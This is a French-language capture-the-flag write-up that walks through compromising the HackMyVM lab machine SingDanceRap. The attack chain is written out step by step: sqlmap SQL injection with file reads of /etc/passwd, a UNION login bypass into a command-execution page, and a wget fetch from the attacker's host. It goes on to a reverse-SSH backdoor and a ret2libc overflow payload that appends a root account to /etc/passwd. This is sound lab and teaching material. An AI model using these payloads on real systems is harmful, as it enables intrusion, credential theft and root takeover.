---
title: "Solution du CTF SingDanceRap de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

### Présentation

SingDanceRap est un CTF créé par un certain `he110wor1d`.

La VM provenant de HackMyVM, on ne dispose pas de descriptif ou d'objectifs ce qui est bien dommage.

Une fois la VM importée et démarrée, on commence par un ping-scan :

```console
$ sudo nmap -T5 -sP 192.168.56.1/24
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 192.168.56.100
Host is up (0.000083s latency).
MAC Address: 08:00:27:69:4E:B6 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.102
Host is up (0.00064s latency).
MAC Address: 08:00:27:4B:A4:6C (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 3.74 seconds
```

Dans les hôtes découverts on trouve la VM grace à son adresse MAC explicite.

On peut déchainer le Nmap qui trouve deux ports ici:

```console
$ sudo nmap -p- -T5 -sV -sC 192.168.56.102
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 192.168.56.102
Host is up (0.00015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 5d:41:2a:c1:2d:3b:6c:78:b3:af:ae:9d:42:fe:88:b8 (RSA)
|   256 3c:e9:64:eb:84:fe:5c:83:94:07:27:6c:12:14:c8:4c (ECDSA)
|_  256 09:9b:2b:18:de:6c:6d:f8:8b:15:df:6c:0f:c0:7c:b2 (ED25519)
80/tcp    open     http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: News Website
65000/tcp filtered unknown
MAC Address: 08:00:27:4B:A4:6C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.31 seconds
```

### Let's Dance

Sur le port 80 on trouve un site web basé sur PHP (l'extension des scripts est visible).

Je créé un environnement virtual Python et l'active pour installer la dernière version de `Wapiti`:

```bash
python3 -m venv wapiti3
. wapiti3/bin/activate
pip install wapiti3
```

Il trouve immédiatement une faille SQL:

```console
$ wapiti -u http://192.168.56.102/ --color -m all

     __      __               .__  __  .__________
    /  \    /  \_____  ______ |__|/  |_|__\_____  \
    \   \/\/   /\__  \ \____ \|  \   __\  | _(__  <
     \        /  / __ \|  |_> >  ||  | |  |/       \
      \__/\  /  (____  /   __/|__||__| |__/______  /
           \/        \/|__|                      \/
Wapiti 3.2.4 (wapiti-scanner.github.io)
[*] Saving scan state, please wait...

[*] Launching module ssrf

[*] Launching module log4shell

[*] Launching module wp_enum
No WordPress Detected

[*] Launching module csp
CSP is not set

[*] Launching module sql
---
SQL Injection in http://192.168.56.102/news.php via injection in the parameter title
Evil request:
    GET /news.php?title=dance%27%20AND%2086%3D86%20AND%20%2755%27%3D%2755 HTTP/1.1
    host: 192.168.56.102
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
---
---
SQL Injection in http://192.168.56.102/news.php via injection in the parameter title
Evil request:
    GET /news.php?title=rap%27%20AND%2059%3D59%20AND%20%2723%27%3D%2723 HTTP/1.1
    host: 192.168.56.102
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
---
---
SQL Injection in http://192.168.56.102/news.php via injection in the parameter title
Evil request:
    GET /news.php?title=sing%27%20AND%2018%3D18%20AND%20%2772%27%3D%2772 HTTP/1.1
    host: 192.168.56.102
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
---

--- snip ---

[*] Launching module timesql
---
Blind SQL vulnerability in http://192.168.56.102/news.php via injection in the parameter title
Evil request:
    GET /news.php?title=%27%20or%20sleep%2811%29%231 HTTP/1.1
---

```

On enchaîne avec `sqlmap`. On n'oublie pas de mettre les paramètres `level` et `risk` au max pour ne rien rater.

```console
sqlmap -u "http://192.168.56.102/news.php?title=sing" --level 5 --risk 3
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.4#pip}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:33:36

[15:33:36] [INFO] testing connection to the target URL
[15:33:36] [INFO] checking if the target is protected by some kind of WAF/IPS
[15:33:36] [INFO] testing if the target URL content is stable
[15:33:36] [INFO] target URL content is stable
[15:33:36] [INFO] testing if GET parameter 'title' is dynamic
[15:33:36] [INFO] GET parameter 'title' appears to be dynamic
[15:33:36] [WARNING] heuristic (basic) test shows that GET parameter 'title' might not be injectable
[15:33:36] [INFO] testing for SQL injection on GET parameter 'title'
[15:33:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:33:37] [INFO] GET parameter 'title' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="for")
[15:33:37] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
[15:33:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[15:33:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[15:33:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[15:33:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[15:33:41] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[15:33:41] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[15:33:41] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[15:33:41] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[15:33:41] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[15:33:41] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[15:33:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[15:33:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[15:33:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[15:33:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[15:33:41] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[15:33:41] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[15:33:41] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[15:33:41] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[15:33:41] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[15:33:41] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[15:33:41] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[15:33:41] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[15:33:41] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[15:33:41] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[15:33:41] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[15:33:41] [INFO] testing 'Generic inline queries'
[15:33:41] [INFO] testing 'MySQL inline queries'
[15:33:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[15:33:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[15:33:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[15:33:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[15:33:41] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[15:33:41] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[15:33:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[15:33:51] [INFO] GET parameter 'title' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[15:33:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[15:33:51] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[15:33:51] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[15:33:51] [INFO] target URL appears to have 3 columns in query
[15:33:51] [INFO] GET parameter 'title' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'title' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 66 HTTP(s) requests:
---
Parameter: title (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: title=sing' AND 7521=7521-- btpz

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=sing' AND (SELECT 1168 FROM (SELECT(SLEEP(5)))mcsX)-- Oxsl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: title=sing' UNION ALL SELECT NULL,CONCAT(0x7170707871,0x4c614776545a6b776b43437675786d4e56494d4b59556150614362707a537353616b555072454b48,0x7170717171),NULL-- -
---
[15:33:55] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.59
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[15:33:55] [INFO] fetched data logged to text files under '/home/nico/.local/share/sqlmap/output/192.168.56.102'

[*] ending @ 15:33:55
```

sqlmap validant la vulnérabilité, on peut désormais l'utiliser pour l'exploitation.

Avec l'option `--privileges` je peux dumper les privilèges du compte utilisé (ici `root`).


```
[15:34:49] [INFO] fetching database users privileges
database management system users privileges:
[*] 'root'@'localhost' (administrator) [29]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TABLESPACE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DELETE HISTORY
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE
[*] 'wpUser'@'localhost' [1]:
    privilege: USAGE
```

J'ai entre autres le privilège `FILE` qui peut permettre de lire les fichiers du système.

J'ai dumpé les hashs avec `--password` mais je n'ai pas été en mesure de les casser:

```
database management system users password hashes:
[*] root [1]:
    password hash: *10A336BFD5A0DD68031AFFE4C164B1886EF3A5AA
[*] wpUser [1]:
    password hash: *D1C12D29CD1C3D6D5ADAA2D8AABA21F2EA4B8495
```

Dans la base on trouve une table contenant des utilisateurs mais ça ne me dit pas où les utiliser à ce stade.

```
Database: news_db
Table: users
[2 entries]
+----+-----------+----------+
| id | password  | username |
+----+-----------+----------+
| 1  | password1 | user1    |
| 2  | password2 | user2    |
+----+-----------+----------+
```

Je suis donc passé sur la lecture des fichiers, par exemple avec `--file-read /etc/passwd`.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
_rpc:x:106:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:107:65534::/var/lib/nfs:/usr/sbin/nologin
tftp:x:108:112:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
mysql:x:110:115:MySQL Server,,,:/nonexistent:/bin/false
he110wor1d:x:1001:1001::/home/he110wor1d:/bin/bash
```

On serait tenté de brute-forcer le compte utilisateur mais une tentative SSH montre que l'authentification se fera uniquement par clé:

```console
$ ssh he110wor1d@192.168.56.102
he110wor1d@192.168.56.102: Permission denied (publickey).
```

Comme je commençais à être sec j'ai fouillé dans la configuration Apache (`/etc/apache2/apache2.conf`):

```apache
<Directory />
    Options FollowSymLinks
    AllowOverride None
    Require all denied
</Directory>

<Directory /usr/share>
    AllowOverride None
    Require all granted
</Directory>

<Directory /var/www/he110wor1d/>
    Options -Indexes
    AllowOverride None
    Require all granted
</Directory>

<VirtualHost *:80>
    DocumentRoot /var/www/he110wor1d
    <Directory /var/www/he110wor1d>
        Options -Indexes
        AllowOverride None
        Require all granted
    </Directory>

    <FilesMatch \.php$>
        SetHandler application/x-httpd-php
    </FilesMatch>

   ErrorLog ${APACHE_LOG_DIR}/xxx_error.log
   CustomLog ${APACHE_LOG_DIR}/xxx_access.log combined
</VirtualHost>
```

J'ai alors tenté d'uploader un shell avec les options de sqlmap `--file-write /tmp/shell.php --file-dest /var/www/he110wor1d/shell.php`.

Sans surprise, ça a été un échec, les MySQL récents disposant d'un répertoire cloisonné pour les uploads.

J'ai dumpé le contenu du script PHP vulnérable `news.php`:

```php
<?php
$servername = "localhost";
$username = "root";
$password = "i_love_sing_dance_rap";
$dbname = "news_db";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
}

$sql = "SELECT id, title, content FROM news where title='$_GET[title]'";
$result = $conn->query($sql);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>News Articles</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 80%;
            margin: 0 auto;
            padding: 20px;
        }
        .news-item {
            background-color: #fff;
            margin-bottom: 20px;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .news-item h2 {
            margin-top: 0;
            color: #333;
        }
        .news-item p {
            color: #666;
        }
        .news-item a {
            display: inline-block;
            margin-top: 10px;
            padding: 10px 15px;
            background-color: #007BFF;
            color: #fff;
            text-decoration: none;
            border-radius: 5px;
        }
        .news-item a:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>News Articles</h1>
        <?php
        if ($result->num_rows > 0) {
            while($row = $result->fetch_assoc()) {
                echo "<div class='news-item'>";
                echo "<h2>" . htmlspecialchars($row['title']) . "</h2>";
                echo "<p>" . htmlspecialchars($row['content']) . "</p>";
                echo "<a href='#'>Read More</a>";
                echo "</div>";
            }
        } else {
            echo "<p>No news articles found.</p>";
        }
        $conn->close();
        ?>
    </div>
</body>
</html>
```

On a un mot de passe ici, mais il ne nous est d'aucune utilité.

### Sing Loud, Sing Proud

J'avais épuisé mon stock d'idées et commençait à me demander si je n'étais pas un peu rouillé.

Finalement en énumérant les fichiers sur le serveur web avec une wordlist plus importante (`directory-list-2.3-big.txt`), j'ai trouvé un dossier caché :

```
301      GET        9l       28w      324c http://192.168.56.102/littlesecrets => http://192.168.56.102/littlesecrets/
```

Le dossier redirigeant vers un 403 il fallait ensuite énumérer dedans :

```
200      GET       69l      142w     1983c http://192.168.56.102/littlesecrets/login.php
302      GET        0l        0w        0c http://192.168.56.102/littlesecrets/manager.php => login.php
```

Là, j'ai pu utiliser `file-read` pour voir le code source de `login.php`:

```php
$login_error = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sql = "SELECT id, username, password FROM users where username='$username'";
    $result = $conn->query($sql);
    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        if ($password === $row['password']) {
            session_start();
            $_SESSION['user_id'] = $row['id'];
            $_SESSION['username'] = $row['username'];
            header("Location: manager.php");
            exit();
        } else {
            $login_error = "Invalid username or password.";
        }
    } else {
        $login_error = "Invalid username or password.";
    }
}
$conn->close();
```

Si je tente d'utiliser un compte utilisateur que j'ai dumpé plus tôt ça échoue :

```
Access Denied. You do not have permission to access this page.
```

Ce message provient de `manager.php`:

```php
<?php
session_start();

if (!isset($_SESSION['username'])) {
        header("Location: login.php");
        exit();
}

if ($_SESSION['username'] !== 'he110wor1d_admin') {
        die("Access Denied. You do not have permission to access this page.");
}

$command_output = '';

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['command'])) {
        $command = $_POST['command'];
            $command_output = shell_exec($command);
}
?>
```

Par conséquent il faut que `login.php` écrit dans le dictionnaire de session le nom d'utilisateur `he110wor1d_admin` qui n'existe pas.

La technique consiste à faire une injection SQL qui va ajouter des lignes de résultat dynamiquement. Cela se fait par une `UNION`: `' UNION SELECT 1, 'he110wor1d_admin', 'yolo`

Ainsi la requête exécutée sera:

```sql
SELECT id, username, password
FROM users where username=''
UNION SELECT 1, 'he110wor1d_admin', 'yolo'
```

Comme il n'y a pas d'utilisateur avec un nom vide, seul notre ligne ajoutée sera retournée par la requête.

Je peux donc me connecter avec `he110wor1d_admin` / `yolo` et accéder au script `manager.php` qui permet d'exécuter des commandes sur le système.


### Rap Battle

Les commandes sont exécutées en tant que `www-data`. Les permissions sur le dossier de l'utilisateur semblaient nous faciliter la tache:

```
drwxr-xr-x 3 www-data www-data 4096 Mar  2 07:05 /var/www
```

J'ai donc créé un dossier `.ssh` et copié une clé privée SSH:

```bash
wget -O /var/www/.ssh/hacker http://192.168.56.1:8000/hacker; chmod 600 /var/www/.ssh/hacker
```

Toutefois impossible de se connecter ensuite, l'utilisateur devant être non autorisé sur le service.

C'est donc reparti avec ce bon vieux `reverse-sshx86` (oui la VM est en 32bits) qui écoute par défaut sur le port 31337 et accepte n'importe quel nom d'utilisateur avec le mot de passe `letmeinbrudipls`.

```console
ssh yolo@192.168.56.102 -p 31337
The authenticity of host '[192.168.56.102]:31337 ([192.168.56.102]:31337)' can't be established.
RSA key fingerprint is SHA256:JSuvLeDoi+aAH8PlIlrL5yW8X/p/LVn+7UAjNDExovo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.56.102]:31337' (RSA) to the list of known hosts.
yolo@192.168.56.102's password: 
www-data@singdancerap:/var/www/he110wor1d/littlesecrets$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Le dossier de l'utilisateur est bien protégé:

```
drwxr-x--- 4 he110wor1d he110wor1d 4096 Mar  3 04:14 he110wor1d/
```

Après avoir cherché des fichiers intéressants sans succès je suis parvenu à me connecter au compte avec le mot de passe du script PHP:

```console
www-data@singdancerap:/tmp$ su he110wor1d
Password: 
he110wor1d@singdancerap:/tmp$ cd
he110wor1d@singdancerap:~$ id
uid=1001(he110wor1d) gid=1001(he110wor1d) groups=1001(he110wor1d)
he110wor1d@singdancerap:~$ ls -alh
total 32K
drwxr-x--- 4 he110wor1d he110wor1d 4.0K Mar  3 04:14 .
drwxr-xr-x 3 root       root       4.0K Mar  1 01:10 ..
lrwxrwxrwx 1 he110wor1d he110wor1d    9 Feb 28 06:49 .bash_history -> /dev/null
-rw-r--r-- 1 he110wor1d he110wor1d  220 Apr 17  2019 .bash_logout
-rw-r--r-- 1 he110wor1d he110wor1d 3.5K Apr 17  2019 .bashrc
drwxr-xr-x 3 he110wor1d he110wor1d 4.0K Mar  1 07:23 .local
-rw-r--r-- 1 he110wor1d he110wor1d  807 Apr 17  2019 .profile
drwxr-x--- 2 he110wor1d he110wor1d 4.0K Mar  3 04:21 thekey2root
-rw------- 1 he110wor1d he110wor1d  109 Feb 28 06:59 user.txt
he110wor1d@singdancerap:~$ cat user.txt 
#SQL injection can not only retrieve data but also forge it.

User flag:107883ee-f5e4-11ef-8542-005056207011
```

### Rap God

Dans ce dossier `thekey2root` on trouve un exécutable setuid root:

```console
he110wor1d@singdancerap:~$ ls -alh thekey2root/
total 24K
drwxr-x--- 2 he110wor1d he110wor1d 4.0K Mar  3 04:21 .
drwxr-x--- 4 he110wor1d he110wor1d 4.0K Mar  3 04:14 ..
-rwsr-sr-x 1 root       root        16K Mar  1 00:23 thekey2root
```

Un petit coup de `strings` laisse supposer de l'injection de commande ou du buffer overflow: 

```console
he110wor1d@singdancerap:~$ strings thekey2root/thekey2root 
tdl 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
setuid
__isoc99_scanf
system
setgid
__libc_start_main
GLIBC_2.7
GLIBC_2.0
__gmon_start__
UWVS
[^_]
echo 'input something:'
echo 'thanks for your input'
echo 'Hey,bro! What are you looking for?'
;*2$"0
GCC: (Debian 8.3.0-6) 8.3.0
crtstuff.c
deregister_tm_clones
```

Pour mieux comprendre j'ouvre le binaire dans Cutter:

```nasm
int main (int argc, char **argv, char **envp);
; var int32_t var_8h @ ebp-0x8
; arg char **argv @ esp+0x24
0x08049192      lea     ecx, [argv]
0x08049196      and     esp, 0xfffffff0
0x08049199      push    dword [ecx - 4]
0x0804919c      push    ebp
0x0804919d      mov     ebp, esp
0x0804919f      push    ebx
0x080491a0      push    ecx
0x080491a1      call    __x86.get_pc_thunk.bx ; sym.__x86.get_pc_thunk.bx
0x080491a6      add     ebx, 0x2e5a
0x080491ac      sub     esp, 0xc
0x080491af      lea     eax, [ebx - 0x1ff8]
0x080491b5      push    eax        ; const char *string
0x080491b6      call    system     ; sym.imp.system ; int system(const char *string)
0x080491bb      add     esp, 0x10
0x080491be      call    input      ; sym.input
0x080491c3      sub     esp, 0xc
0x080491c6      lea     eax, [ebx - 0x1fe0]
0x080491cc      push    eax        ; const char *string
0x080491cd      call    system     ; sym.imp.system ; int system(const char *string)
0x080491d2      add     esp, 0x10
0x080491d5      mov     eax, 0
0x080491da      lea     esp, [var_8h]
0x080491dd      pop     ecx
0x080491de      pop     ebx
0x080491df      pop     ebp
0x080491e0      lea     esp, [ecx - 4]
0x080491e3      ret
input ();
; var int32_t var_1ch @ ebp-0x1c
; var int32_t var_4h @ ebp-0x4
0x080491e4      push    ebp
0x080491e5      mov     ebp, esp
0x080491e7      push    ebx
0x080491e8      sub     esp, 0x24
0x080491eb      call    __x86.get_pc_thunk.ax ; sym.__x86.get_pc_thunk.ax
0x080491f0      add     eax, 0x2e10
0x080491f5      sub     esp, 8
0x080491f8      lea     edx, [var_1ch]
0x080491fb      push    edx
0x080491fc      lea     edx, [eax - 0x1fc3]
0x08049202      push    edx        ; const char *format
0x08049203      mov     ebx, eax
0x08049205      call    __isoc99_scanf ; sym.imp.__isoc99_scanf ; int scanf(const char *format)
0x0804920a      add     esp, 0x10
0x0804920d      nop
0x0804920e      mov     ebx, dword [var_4h]
0x08049211      leave
0x08049212      ret
```

Ici les appels à `system` sont utilisés pour les commandes `echo`. Le `scanf` dans la fonction `input` est évidemment vulnérable à une stack overflow.

En plus de la présence de `system` déjà présent dans les imports, je trouve aussi dans le code désassemblé une fonction non utilisée qui fait un setuid/setgid 0: 

```nasm
sing_dance_rap ();
; var int32_t var_4h @ ebp-0x4
0x08049213      push ebp
0x08049214      mov ebp, esp
0x08049216      push ebx
0x08049217      sub esp, 4
0x0804921a      call __x86.get_pc_thunk.bx ; sym.__x86.get_pc_thunk.bx
0x0804921f      add ebx, 0x2de1
0x08049225      sub esp, 0xc
0x08049228      push 0
0x0804922a      call setuid        ; sym.imp.setuid
0x0804922f      add esp, 0x10
0x08049232      sub esp, 0xc
0x08049235      push 0
0x08049237      call setgid        ; sym.imp.setgid
0x0804923c      add esp, 0x10
0x0804923f      sub esp, 0xc
0x08049242      lea eax, [ebx - 0x1fc0]
0x08049248      push eax           ; const char *string, correspond à 'echo "Hey,bro! What are you looking for?"'
0x08049249      call system        ; sym.imp.system ; int system(const char *string)
0x0804924e      add esp, 0x10
0x08049251      nop
0x08049252      mov ebx, dword [var_4h]
0x08049255      leave
0x08049256      ret
```

On n'a pas moyen de contrôler ce qui est passé à `system`, surtout que la commande appelée (`echo`) est une macro de bash et non un binaire externe (donc pas d'hijack de PATH possible).

L'idée est plus d'écraser l'adresse de retour par `sing_dance_rap` pour déclencher setuid/setgid puis enchainer avec un ret2libc pour appeler `system`.

Déjà si on passe 20 fois l'adresse de `sing_dance_rap` à `scanf`, on observe bien le détournement du flot d'exécution :

```console
he110wor1d@singdancerap:~$ python -c 'print(b"\x13\x92\x04\x08"*20)' | thekey2root/thekey2root
input something:
Hey,bro! What are you looking for?
Hey,bro! What are you looking for?
Hey,bro! What are you looking for?
Hey,bro! What are you looking for?
Hey,bro! What are you looking for?
Hey,bro! What are you looking for?
Hey,bro! What are you looking for?
Hey,bro! What are you looking for?
Hey,bro! What are you looking for?
Hey,bro! What are you looking for?
Hey,bro! What are you looking for?
Hey,bro! What are you looking for?
Segmentation fault
he110wor1d@singdancerap:~$ python -c 'print(b"\x13\x92\x04\x08"*9)' | thekey2root/thekey2root
input something:
Hey,bro! What are you looking for?
Segmentation fault
```

Donc, 9 fois permettent d'exécuter la fonction une seule fois.

Pour ce qui est de `system` je le vois à l'adresse `0x08049040` dans les imports Cutter.

Reste à trouver une chaîne de caractère à passer à `system`. On pourrait galérer à trouver un `sh` mais n'importe quoi fera l'affaire. Je trouve `;*2$\"0` à 0x0804a137 donc `0` à 0x0804a13c.

Je crée un script nommé `0` qui va ajouter un compte avec le mot de passe `hello`. Puis je passe les adresses pour chainer les différentes exécutions:

```console
he110wor1d@singdancerap:~$ echo -e '#!/usr/bin/bash\necho devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh >> /etc/passwd\n' > 0
he110wor1d@singdancerap:~$ chmod 755 0
he110wor1d@singdancerap:~$ python -c 'print(b"\x13\x92\x04\x08"*9 + b"\x40\x90\x04\x08" + b"\x3c\xa1\x04\x08"*2 )' | PATH=.:$PATH thekey2root/thekey2root
input something:
Hey,bro! What are you looking for?
Segmentation fault
he110wor1d@singdancerap:~$ su devloop
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
#During the process of PWN, the execution of the system function does not necessarily have to be bash.

root flag:943ac8c9-f696-11ef-8bd4-005056207011
```

Victoire les doigts dans ta soeur!
